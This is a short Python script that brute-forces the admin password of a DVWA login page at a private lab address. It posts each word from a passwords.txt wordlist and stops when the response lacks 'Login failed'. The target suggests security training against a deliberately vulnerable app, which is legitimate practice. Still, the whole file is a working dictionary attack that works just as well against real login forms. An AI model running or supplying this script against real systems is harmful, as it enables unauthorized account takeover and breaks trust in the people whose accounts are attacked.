#!/usr/bin/env python

import requests

targetURL = "http://10.10.10.2/dvwa/login.php"
dataDict = {"username": "admin", "password": "", "Login": "submit"}

with open("passwords.txt", "r") as f:
    for line in f:
        word = line.strip()
        dataDict["password"] = word
        response = requests.post(targetURL, data=dataDict)
        if "Login failed" not in response.content.decode():
            print("[+] Got the password --> " + word)
            exit()
